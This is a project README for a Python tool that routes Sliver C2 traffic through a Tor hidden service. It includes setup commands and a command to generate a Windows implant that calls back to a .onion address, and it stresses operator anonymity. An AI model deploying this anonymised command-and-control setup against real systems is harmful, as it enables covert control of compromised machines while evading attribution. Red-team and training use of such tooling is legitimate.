# Sliver Tor Bridge

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)

**Tor-based transport bridge for [Sliver C2](https://github.com/BishopFox/sliver) that enables anonymous command and control operations through Tor Hidden Services.**

## Features

- 🧅 **Automatic Hidden Service** - Creates `.onion` address on startup
- 🔒 **Operator Anonymity** - Your C2 server IP is never exposed
- 🚀 **Zero Sliver Modification** - Works with stock Sliver, any version
- 📦 **Easy Installation** - Single pip install
- 🐳 **Docker Support** - Optional containerized deployment

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                     YOUR MACHINE                            │
│  ┌──────────────┐    ┌───────────────┐    ┌──────────────┐  │
│  │    Sliver    │◄──►│  Tor Bridge   │◄──►│ Tor Hidden   │  │
│  │   Server     │    │   (Proxy)     │    │  Service     │  │
│  │  :8443       │    │   :8080       │    │ xyz.onion    │  │
│  └──────────────┘    └───────────────┘    └──────┬───────┘  │
└──────────────────────────────────────────────────┼──────────┘
                                                   │
                                         ┌─────────▼─────────┐
                                         │   TOR NETWORK     │
                                         │ (3 encrypted hops)│
                                         └─────────┬─────────┘
                                                   │
                                         ┌─────────▼─────────┐
                                         │  Sliver Implant   │
                                         │   (via Tor)       │
                                         └───────────────────┘
```

## Installation

```bash
# Clone the repository
git clone https://github.com/Otsmane-Ahmed/sliver-tor-bridge.git
cd sliver-tor-bridge

# Create virtual environment
python3 -m venv venv
source venv/bin/activate

# Install
pip install -e .
```

**Prerequisites:**
- Python 3.8+
- Tor installed (`sudo apt install tor`)
- Sliver C2 ([install guide](https://sliver.sh/docs?name=Install))

## Quick Start

### 1. Start Sliver with HTTPS Listener

```bash
sliver-client
sliver > https -L 127.0.0.1 -l 8443
```

### 2. Start the Tor Bridge

```bash
# Stop system Tor to avoid port conflicts
sudo systemctl stop tor

# Start the bridge
sliver-tor-bridge start --sliver-port 8443
```

Output:
```
============================================================
       SLIVER TOR BRIDGE - Anonymous C2 Transport
============================================================

[+] Tor started successfully!
[+] Hidden Service: http://abc123xyz.onion

[+] Bridge is READY!

Generate Sliver implant with:
sliver > generate --http http://abc123xyz.onion --os windows --save /tmp/implant.exe
```

### 3. Generate Implant with .onion Address

```bash
sliver > generate --http http://abc123xyz.onion --os windows --save /tmp/implant.exe
```

### 4. Deploy & Control

The implant connects through Tor → You control it through Sliver. Your IP is never exposed!

## CLI Reference

```bash
sliver-tor-bridge start [OPTIONS]    # Start the bridge
sliver-tor-bridge status             # Check hidden service status  
sliver-tor-bridge stop               # Remove hidden service directory
sliver-tor-bridge generate-config    # Create config.yaml template
```

**Options:**
| Flag | Default | Description |
|------|---------|-------------|
| `--sliver-port` | 8443 | Sliver HTTPS listener port |
| `--tor-port` | 9050 | Tor SOCKS port |
| `--service-port` | 80 | Hidden service port |
| `-c, --config` | None | Path to config file |

## Docker Deployment

```bash
docker-compose up -d
docker-compose logs -f
```

## Use Cases

- **Red Team Operations** - Anonymous C2 during penetration tests
- **Security Research** - Study C2 patterns without attribution
- **Training** - Learn Tor + C2 integration in lab environments

## How It Works

1. **Tor Manager** creates a Hidden Service pointing to local proxy
2. **HTTP Proxy** receives connections from the Hidden Service
3. **Proxy forwards** all traffic to Sliver's HTTPS listener
4. **Sliver handles** the implant communication normally

The implant thinks it's talking to a normal HTTP server. Sliver thinks it's receiving normal HTTPS connections. The Tor layer is transparent to both.

## Disclaimer

⚠️ **For authorized security testing and educational purposes only.** Using this tool on systems without explicit permission is illegal. The author is not responsible for misuse.

## Credits

- [Sliver C2](https://github.com/BishopFox/sliver) by BishopFox
- [Stem](https://stem.torproject.org/) - Python Tor controller library

## License

MIT License - see [LICENSE](LICENSE)

---

<p align="center">
  <b>Made by <a href="https://github.com/Otsmane-Ahmed">Otsmane Ahmed</a></b>
</p>
